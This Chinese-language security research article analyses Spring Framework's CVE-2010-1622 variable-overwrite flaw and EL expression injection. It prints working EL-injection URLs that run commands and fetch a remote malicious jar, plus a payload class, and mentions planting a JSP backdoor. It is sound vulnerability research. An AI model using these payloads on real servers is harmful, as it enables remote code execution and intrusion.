# Spring框架问题分析

0x00 概述
-------

* * *

Spring作为使用最为广泛的Java Web框架之一，拥有大量的用户。也由于用户量的庞大，Spring框架成为漏洞挖掘者关注的目标，在Struts漏洞狂出的如今，Spring也许正在被酝酿一场大的危机。

本文将针对Spring历史上曾出现的严重漏洞和问题，进行分析讨论这套框架可能存在的问题。

0x01 变量覆盖问题
-----------

* * *

CVE-2010-1622在Spring官方发布的漏洞公告中，被定义为任意代码执行漏洞。但是，这个问题的主要问题是由于，对私有成员保护不足，而导致的变量覆盖。从漏洞成因上来看并不能称为代码执行漏洞，只能算是变量覆盖，代码执行只不过是利用罢了。

Spring框架提供了一种绑定参数和对象的机制，可以把一个类绑定到一个Controller。然后在这个Contraller类中，将一个页面绑定到特定的处理方法中，这个方法可以把页面参数中，与对象成员对应的参数值赋予该成员。

例如：我绑定了一个User类，User类中存在一个成员name，绑定的页面名为test.html。那么如果我提交test.html?name=123，User类中的name便被赋予值为123。

当然这种使用方法是有前题的，就是这个成员是public或者提供set方法，否则是不能赋值的。这个漏洞就是这个限制出现了问题，导致数组类型的成员在非public且没有提供set方法的情况下，可以通过这种方式被赋值。我们下面来看负责这个功能实现的类对于数组参数的处理代码：

```
else if (propValue.getClass().isArray()) { Class requiredType = propValue.getClass().getComponentType(); int arrayIndex = Integer.parseInt(key); Object oldValue = null; try { if (isExtractOldValueForEditor()) { oldValue = Array.get(propValue, arrayIndex); } Object convertedValue = this.typeConverterDelegate.convertIfNecessary( propertyName, oldValue, pv.getValue(), requiredType); Array.set(propValue, Integer.parseInt(key), convertedValue); }

```

可以看出上面处理数组的代码中，没有对成员是否存在set方法进行判断。也没有通过调用成员的set方法进行赋值，而是直接通过Array.set方法进行赋值，绕过set方法的这个处理机制。

在漏洞发现者的博客上，提到了Java Bean的API Introspector. getBeanInfo 会获取到该POJO的基类Object.class的属性class,进一步可以获取到Class.class的诸多属性，包括classloader。

而Spring的org.springframework.beans.CachedIntrospectionResults.class类，正好通过这个API，遍历用户提交表单中有效的成员。这就意味着，结合这个漏洞，我们可以通过HTTP提交，来设置很多的私有成员，这真是太恐怖了！

下面我们来看看，如何将Spring这个特性和漏洞结合起来，进行利用。  
之前我们提到了我们可以通过Java

Bean获取到classloader对象，而classloader中有一个URLs[]成员。Spring刚好会通过Jasper中的 TldLocationsCache类（jsp平台对jsp解析时用到的类）从WebappClassLoader里面读取url参数，并用来解析TLD文件在解析TLD的时候，是允许直接使用jsp语法的，所以这就出现了远程代码执行的最终效果。

好了，到这里我们整理下思路。通过漏洞我们可以对classloader的URLs[]进行赋值操作，然后Spring会通过平台解析，从URLs[]中提取它所需要的TLD文件，并在执行jsp是运行这个TLD所包含的内容。

有了这个思路，利用方法也就呼之欲出了。构造一个带有恶意TLD文件的jar，通过HTTP将jar的地址告诉URLs[]，然后坐等执行。  
利用效果如图所示：

![2014082810301026119.png](http://drops.javaweb.org/uploads/images/d923339cbbafddabecaeeac357abf03e2a80fdae.jpg)

0x02 EL表达式注入问题
--------------

* * *

2012年12月国外研究者DanAmodio发表《Remote Code with Expression Language Injection》一文，拉开了Spring框架EL表达式注入的序幕。

随着表达式的愈加强大，使得原来本不应该出问题的情况，出现了一些比较严重的问题。而且Java Web框架一般都会有在核心代码使用表达式的坏习惯，Struts就是很好的例子。Spring的框架本身是不会存在代码执行的问题，但是随着EL表达式的强大，逐渐成为了问题。而且EL表达式是Java Web程序默认都会使用的一种表达式，这可能会在未来一段时间内成为Java Web程序的噩梦。

我通过代码跟踪定位到Spring最终执行EL表达式的代码：

```
private static Object evaluateExpression(String exprValue, Class resultClass, PageContext pageContext)
        throws ELException {

    return pageContext.getExpressionEvaluator().evaluate(
            exprValue, resultClass, pageContext.getVariableResolver(), null);
}

```

了解了Spring标签属性执行EL表达式的大体流程：首先通过标签类处理相关内容，将需要执行EL表达式的标签属性传入到evaluateString或者其他方法，但最终都将流入到doEvaluate方法中，经过一些处理将截取的属性值最为传入到evaluateExpression方法，最后evaluateExpression方法再将传入的属性值作为表达式交给平台去执行。

以上这些其实仅仅是对EL表达式注入问题分析的开始，因为真正实现执行的地方是平台，也就是说，不同的平台EL表达式的操作和执行也是不同的。因此，我分别针对Glassfish和Resin平台进行了测试，目前比较流行的Tomcat平台也进行了测试，但是由于它和Spring框架在EL表达式的实现上存在一些分歧，导致Tomcat平台下EL表达式不可以调用方法。

下面我们分别来看看Glassfish和Resin平台下，不同的利用方法。  
先来看Glassfish下的利用，首先在我们另一台服务器上放置编译如下代码的jar文件：

```
public class Malicious { public Malicious() { try { java.lang.Runtime.getRuntime().exec("calc.exe"); //Win } catch (Exception e) { } } }       

```

然后我们通过EL表达式创建一个数组（URLClassLoader的构造函数需要URL数组作为参数），存放在session中，url为

```
http://target/file? message=${pageContext.request.getSession().setAttribute("arr","".getClass().forName("java.util.ArrayList").newInstance())}。  

```

下一步我们通过URI提供的create方法，可以创建一个URL实例，我们把这个实例保存在刚刚创建的数组中，url为

```
http://target/file?message= ${pageContext.request.getSession().getAttribute("arr").add(pageContext.getServletContext().getResource("/").toURI().create("http://serverip/Malicious.jar").toURL())}。  

```

Malicious.jar文件就是我们之前保存在另一台服务器中的jar文件。EL表达式中的PageContext类中getClassLoader方法得到的对象的父类便是URLClassLoader，所以，我们便可以调用newInstance方法了，url为

```
http://target/file?message= ${pageContext.getClass().getClassLoader().getParent().newInstance(pageContext.request.getSession().getAttribute("arr").toArray(pageContext.getClass().getClassLoader().getParent().getURLs())).loadClass("Malicious").newInstance()}。  

```

效果如下图所示：

![此处输入图片的描述](http://drops.javaweb.org/uploads/images/21cd04b9e3f82ea29f14e074a4c6e272c70c198c.jpg)

下面我们来看下在Resin环境下的利用方法，先来看个直接的演示，访问链接：

```
http://localhost:8080/test.do?${pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc",null).toString()}  

```

效果如下图所示：

![此处输入图片的描述](http://drops.javaweb.org/uploads/images/7e0d5defd6c000ec3a46618e343eb9fb99dffbce.jpg)

我曾一度想要写出像Struts那样可以执行命令并回显的利用代码，但是由于EL表达式并没有提供变量和赋值的功能，让我不得不去想可以有相同的效果的方法。初步的思路是，利用EL可以存储任意类型session这个功能，对命令执行的结果流进行存储和处理，最后转换为字符串，打印到页面上。

我找到了打印任意内容到页面的方法，即通过EL提供的pageContext中response对象中的println方法。例如：访问

```
http://localhost:8080/test.do?a=${pageContext.response.getWriter().println('aaa')}  

```

会返回500错误，在错误中会显示我们的自定义内容：

![此处输入图片的描述](http://drops.javaweb.org/uploads/images/6130060279939710803ff03d76f31a7b7aa40f96.jpg)

下面只要将命令执行的结果流转换为String，输出给println函数即可。下面是按照我之前思路，构造的利用代码：

```
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami",null).getInputStream())}

${pageContext.request.getSession().setAttribute("b",pageContext.request.getClass().forName("java.io.InputStreamReader").getConstructor(pageContext.request.getClass().forName("java.io.InputStream")).newInstance(pageContext.request.getSession().getAttribute("a")))}

${pageContext.request.getSession().setAttribute("c",pageContext.request.getClass().forName("java.io.BufferedReader").newInstance(pageContext.request.getSession().getAttribute("b")))}

${pageContext.request.getSession().setAttribute("d",pageContext.request.getClass().forName("java.lang.Byte").getConstructor(pageContext.request.getClass().forName("java.lang.Integer")).newInsTance(51020))}

${pageContext.request.getSession().getAttribute("c").read(pageContext.request.getSession().getAttribute("d"))}

${pageContext.response.getWriter().println(pageContext.request.getSession().getAttribute("d"))}

```

首先将命令执行结果流存储至session属性a中；然后将a属性的内容作为初始化InputStreamReader对象的参数，并将对象存储至b属性；第三步将b属性中的内容作为参数初始化BufferedReader对象，并将对象存储至c属性；第四步初始化一个字符数组，存储至d属性中；第五步将c中的内容通过read方法，放入到d属性中，及转化为字符；最后print出d属性中内容。

但是这个思路我没有实现的最终原因是，通过EL使用反射初始化构造方法需要参数的对象时，参数类型和方法定义的参数类型总是不匹配。我想尽了我能想到的办法，最后还是找不到解决办法。

后面想到的一个可行的利用方法，是利用Glassfish平台下使用的方法，加载一个执行写文件到指定目录的jar包，来生成一个jsp后门。

Spring框架中几乎只有标签的部分使用了EL表达式，下面我们将罗列出这些使用EL表达式的标签。

**form 中可执行 EL的标签：**

1.    AbstractDataBoundFormElementTag

2.    AbstractFormTag

3.    AbstractHtmlElementTag

4.    AbstractHtmlInputElementTag

5.    AbstractMultiCheckedElementTag

6.    AbstractSingleCheckedElementTag

7.    CheckboxTag

8.    ErrorsTag

9.    FormTag

10.  LabelTag

11.  OptionsTag

12.  OptionTag

13.  RadioButtonTag

14.  SelectTag

**Spring 标准标签库中执行 EL 的标签**：

1.    MessageTag

2.    TransformTag

3.    EscapeBodyTag

4.    setJavaScriptEscape(String)

5.    EvalTag

6.    HtmlEscapeTag

7.    HtmlEscapingAwareTag

8.    UrlTag

9.    BindErrorsTag

10.  doStartTagInternal()

11.  BindTag

12.  NestedPathTag

0x03 总结
-------

* * *

变量覆盖这个问题，相对于EL表达式注入来说算是个意外情况，修补之后不会有太多先关联的问题出现。而EL表达式这个问题，就有点象Struts的Ognl，是一个持续的问题，对于它的封堵，只能是见一个补一个。毕竟攻击者利用的就是EL提供的功能，我们总不 能因噎废食的要求EL不可以支持方法的调用。